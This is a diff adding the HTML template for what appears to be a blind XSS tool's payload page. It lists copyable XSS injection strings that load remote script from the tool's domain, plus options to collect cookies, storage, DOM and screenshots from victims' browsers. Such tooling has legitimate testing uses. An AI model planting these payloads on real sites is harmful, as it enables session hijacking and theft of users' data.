@@ -1,0 +1,235 @@
+<div class="wrapper">
+
+    {menu}
+
+    <section class="content">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-lg-12">
+                    <div class="view-header">
+                        <div class="header-title">
+                            <h3 class="m-b-xs">Payload</h3>
+                            <small>...</small>
+                        </div>
+                    </div>
+                    <hr>
+                </div>
+            </div>
+
+            {message}
+
+            <div class="row">
+                <div class="col-lg-12">
+                    <select class="form-control" id="payloadList" name="payloadList">
+                        {%foreach payload}
+                            <option value="{payload->id}" {payload->selected}>Payload #{payload->id} | {payload->name}</option>
+                        {%/foreach}
+                    </select>
+                    <br>
+                </div>
+
+                <div class="col-lg-6">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Payloads</div>
+                        <div class="panel-body">
+                            <div class="form-group">
+                                <label class="control-label">Script src</label>
+                                <input class="form-control" disabled
+                                       value='&lt;script src=//{%data domain}&gt;&lt;/script&gt;'><br>
+
+                                <label class="control-label">Script src with closing tag</label>
+                                <input class="form-control" disabled
+                                       value='"&gt;&lt;script src=//{%data domain}&gt;&lt;/script&gt;'><br>
+
+                                <label class="control-label">Script src with closing and opening tag</label>
+                                <input class="form-control" disabled
+                                       value='"&gt;&lt;script src=//{%data domain}>&lt;/script&gt;&lt;x="'><br>
+
+                                <label class="control-label">jQuery</label>
+                                <input class="form-control" disabled
+                                       value='$.getScript("//{%data domain}")'><br>
+
+                                <label class="control-label">Create Element</label>
+                                <input class="form-control"
+                                       disabled
+                                       value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{%data domain}\';document.body.appendChild(a)')"><br>
+
+                                <label class="control-label">Custom Payload example</label>
+                                <input class="form-control" disabled
+                                       value='&lt;script src=//{%data domain}/custom&gt;&lt;/script&gt;'><br>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-6">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Collecting</div>
+                        <div class="panel-body">
+                            <form class="form" id="collecting" method="post">
+                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+                                <div class="row">
+                                    <div class="col-lg-6">
+                                        <div class="form-group">
+                                            <label class="checkbox-label">
+                                                <input {%checked cUri} class="chkbox" name="uri" type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">URL</p>
+                                            <label class="checkbox-label">
+                                                <input {%checked cIP} class="chkbox" name="ip" type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">IP</p>
+                                            <label class="checkbox-label">
+                                                <input {%checked cReferer} class="chkbox" name="referer"
+                                                       type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">Referer</p>
+                                            <label class="checkbox-label">
+                                                <input {%checked cUserAgent} class="chkbox" name="user-agent"
+                                                       type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">User Agent</p>
+                                            <label class="checkbox-label">
+                                                <input {%checked cCookies} class="chkbox" name="cookies"
+                                                       type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">Cookies</p>
+                                        </div>
+                                    </div>
+                                    <div class="col-lg-6">
+                                        <div class="form-group">
+                                            <label class="checkbox-label">
+                                                <input {%checked cLocalStorage} class="chkbox" name="localstorage"
+                                                       type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">Local Storage</p>
+                                            <label class="checkbox-label">
+                                                <input {%checked cSessionStorage} class="chkbox" name="sessionstorage"
+                                                       type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">Session Storage</p>
+                                            <label class="checkbox-label">
+                                                <input {%checked cDOM} class="chkbox" name="dom" type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">DOM</p>
+                                            <label class="checkbox-label">
+                                                <input {%checked cOrigin} class="chkbox" name="origin" type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">Origin</p>
+                                            <label class="checkbox-label">
+                                                <input {%checked cScreenshot} class="chkbox" name="screenshot"
+                                                       type="checkbox">
+                                                <span class="checkbox-custom rectangular"></span>
+                                            </label>
+                                            <p class="checkbox-text">Screenshot</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <button name="collecting" type="submit" class="btn">Save</button>
+                            </form>
+                        </div>
+                    </div>
+
+                    <div class="panel panel-filled" style="height:270px">
+                        <div class="panel-heading">Secondary Payload</div>
+                        <div class="panel-body">
+                            <form class="form" id="secondary-payload" method="post">
+                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+                                <div class="form-group">
+                                    <label class="control-label" for="customjs">Custom javascript</label>
+                                    <textarea class="form-control" id="customjs" name="customjs" rows=5>{%data customjs}</textarea>
+                                </div>
+                                <button name="secondary-payload" type="submit" class="btn">Save</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="row">
+                <div class="col-lg-4">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Extract additional pages</div>
+                        <div class="panel-body">
+                            <form class="form" id="extract-pages" method="post">
+                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+                                <div class="form-group">
+                                    <label class="control-label" for="path">Add new path</label>
+                                    <input class="form-control" id="path" name="path" placeholder="/robots.txt">
+                                </div>
+                                <button name="extract-pages" type="submit" class="btn">Save</button>
+                            </form>
+                            <hr>
+                            <p><b>Pages:</b></p>
+                            {%foreach pages}
+                                <div id="p{pages->id}" class="input-group" style="margin-bottom:15px">
+                                    <input class="form-control" disabled type="text" value="{pages->value}">
+                                    <span class="input-group-addon"><a class="remove-item" data="{pages->value}" divid="p{pages->id}" style="cursor:pointer">Remove</a></span>
+                                </div>
+                            {%/foreach}
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-4">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Blocked domains (blacklist)</div>
+                        <div class="panel-body">
+                            <form class="form" id="blacklist-domains" method="post">
+                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+                                <div class="form-group">
+                                    <label class="control-label" for="blacklist-domain">Add new domain</label>
+                                    <input class="form-control" id="blacklist-domain" name="domain" placeholder="example.com">
+                                </div>
+                                <button name="blacklist-domains" type="submit" class="btn">Save</button>
+                            </form>
+                            <hr>
+                            <p><b>Domains:</b></p>
+                            {%foreach blacklist}
+                                <div id="b{blacklist->id}" class="input-group" style="margin-bottom:15px">
+                                    <input class="form-control" disabled type="text" value="{blacklist->value}">
+                                    <span class="input-group-addon"><a class="remove-item" data="{blacklist->value}" divid="b{blacklist->id}" style="cursor:pointer">Remove</a></span>
+                                </div>
+                            {%/foreach}
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-4">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Allowed only domains (whitelist)</div>
+                        <div class="panel-body">
+                            <form class="form" id="whitelist-domains" method="post">
+                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+                                <div class="form-group">
+                                    <label class="control-label" for="whitelist-domain">Add new domain</label>
+                                    <input class="form-control" id="whitelist-domain" name="domain" placeholder="example.com">
+                                </div>
+                                <button name="whitelist-domains" type="submit" class="btn">Save</button>
+                            </form>
+                            <hr>
+                            <p><b>Domains:</b></p>
+                            {%foreach whitelist}
+                                <div id="w{whitelist->id}" class="input-group" style="margin-bottom:15px">
+                                    <input class="form-control" disabled type="text" value="{whitelist->value}">
+                                    <span class="input-group-addon"><a class="remove-item" data="{whitelist->value}" divid="w{whitelist->id}" style="cursor:pointer">Remove</a></span>
+                                </div>
+                            {%/foreach}
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+</div>
